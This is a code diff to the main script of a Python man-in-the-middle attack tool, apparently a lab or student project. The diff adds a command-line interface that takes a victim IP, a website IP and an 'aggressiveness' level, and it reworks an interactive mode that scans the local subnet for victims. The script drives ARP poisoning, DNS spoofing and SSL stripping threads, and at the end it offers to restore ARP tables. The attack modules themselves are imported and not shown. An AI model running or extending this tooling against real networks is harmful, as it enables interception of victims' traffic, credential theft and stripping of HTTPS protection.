@@ -3,6 +3,7 @@ from dns_spoofing import DNSSpoof
 from dns_learner import DNSLearner
 from ssl_stripping import SSLStrip
 
+import argparse
 import scapy.all as scapy
 import scapy.arch as scarch
 import logging
@@ -10,48 +11,87 @@ import threading
 import time
 import nmap
 
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="Automated MITM attack tool with ARP poisoning, DNS spoofing and SSL stripping capabilities",
+        add_help=True
+    )
+
+    parser.add_argument(
+        "-i", "--interactive",
+        action="store_true",
+        help="Interactive mode"
+    )
+
+    default_interface = scapy.conf.iface
+    parser.add_argument(
+        "-e", "--interface",
+        default=default_interface,
+        help=f"Network interface (default: {default_interface})"
+    )
+
+    parser.add_argument(
+        "-t", "--target",
+        help="Victim IP address"
+    )
+
+    parser.add_argument(
+        "-w", "--website",
+        help="Website IP address"
+    )
+
+    parser.add_argument(
+        "-a", "--aggressiveness",
+        type=int,
+        default=5,
+        help="Aggressiveness level (1-10, default: 5)"
+    )
+
+    args = parser.parse_args()
+
+    if not 1 <= args.aggressiveness <= 10:
+        parser.error("Aggressiveness must be between 1 and 10")
+
+    if not args.interactive:
+        missing = []
+        if not args.target:
+            missing.append("-t/--target")
+        if not args.website:
+            missing.append("-w/--website")
+
+        if missing:
+            parser.error(f"Missing required arguments: {', '.join(missing)} (or use -i)")
+
+    return args
+
 def setup():
-    # Setup attack
-    try:
-        print("> This is a tool for an ARP poisoning and DNS spoofing attack, with SSL stripping functionality.")
-        time.sleep(1)
+    args = parse_args()
 
-        # Pick interface to spoof through
+    if args.interactive:
         ifaces = scarch.get_if_list()
-        print(f"> First, please choose an interface to scan from the following: {ifaces}")
-        iface = input("> Input your chosen interface: ")
+        print(f"Available interfaces: {ifaces}")
+        args.interface = input("> Interface: ").strip()
 
-        # Probe subnet for hosts
-        probe = input("> Probe the subnet for available hosts? Note: This will ping every machine on the network! [Y/N] ").strip().lower()
-        if probe == 'y' or probe == 'yes':
+        probe = input("> Probe subnet for available victims [y/n]? ").strip().lower()
+        if probe == "y" or probe == "yes":
             nm = nmap.PortScanner()
-            print(nm.scan(f"{scarch.get_if_addr(iface)}/24", arguments="-sP"))
-            i = 0
-            for host in nm.all_hosts():
-                print(f"{i}. {host}")
-                i += 1
-        else:
-            print("> No probing.")
+            nm.scan(f"{scarch.get_if_addr(args.interface)}/24", arguments="-sP")
+            print(f"Detected victims: {nm.all_hosts()}")
 
-        # Select target hosts
-        victim = input("> Input the victim IP: ")
-        site = input("> Input the website IP: ")
+        args.target = input("> Victim IP address: ").strip()
+        args.website = input("> Website IP address: ").strip()
+        args.aggressiveness = int(input("> Aggressiveness (1-10): ").strip())
 
-        # Set aggressiveness of the attack (how often the ARP tables are being poisoned)
-        while True:
-            try:
-                timer = int(input("> Aggressiveness (1-10): "))
-                if 1 <= timer <= 10:
-                    break
-                else:
-                    print(">! Integer must be between 1 and 10.")
-            except ValueError:
-                print(">! Please enter an integer.")
-    except KeyboardInterrupt:
-        print("\n> Aborted. Exiting...")
-        exit(0)
+        if not 1 <= args.aggressiveness <= 10:
+            print("error: Aggressiveness must be between 1 and 10")
+            exit(1)
 
-    return iface, victim, site, timer
+    return (
+        args.interface,
+        args.target,
+        args.website,
+        args.aggressiveness
+    )
 
 def run(iface, victim, site, timer):
     stop_event = threading.Event()
@@ -64,7 +104,6 @@ def run(iface, victim, site, timer):
     )
 
     # Learn DNS in a separate thread
-    # TODO Does not work. Look into it
     dns_learner = DNSLearner(iface, arp)
     dns_learn_thread = threading.Thread(
         target=dns_learner.start,
@@ -97,7 +136,7 @@ def run(iface, victim, site, timer):
     except KeyboardInterrupt:
         # Program should stop on CTRL+C
         stop_event.set()
-        print("\n> Attack is being cancelled. Please wait...")
+        print("\nAttack is being cancelled. Please wait...")
 
         arp_thread.join()
         dns_learn_thread.join()
@@ -106,23 +145,22 @@ def run(iface, victim, site, timer):
 
         dns_spoofer.disable_dns_block()
 
-        restore = input("> Restore ARP tables? [Y/N] ").strip().lower()
-        if restore == 'y' or restore == 'yes':
+        restore = input("Restore ARP tables [y/n]? ").strip().lower()
+        if restore == "y" or restore == "yes":
             arp.restore_tables(arp.victimIP, arp.websiteIP, arp.victimMAC, arp.websiteMAC)
+
             if arp.dnsIP:
                 arp.restore_tables(arp.victimIP, arp.dnsIP, arp.victimMAC, arp.dnsMAC)
-            print("> ARP tables restored. Exiting...")
-            exit(0)
+
+            print("ARP tables were restored. Exiting...")
         else:
-            print("> ARP tables left spoofed. Exiting...")
-            exit(0)
+            print("ARP tables were not restored. Exiting...")
+
+        exit(0)
 
 if __name__ == "__main__":
     scapy.conf.verb = 0
     logging.getLogger("scapy").setLevel(logging.ERROR)
 
-    #iface, victim, site, timer = setup()
-    #run(iface, victim, site, timer)
-
-    # TODO: Eventually remove this and uncomment the lines above
-    run("eth0", "172.18.0.10", "172.18.0.30", 5)
+    iface, victim, site, timer = setup()
+    run(iface, victim, site, timer)
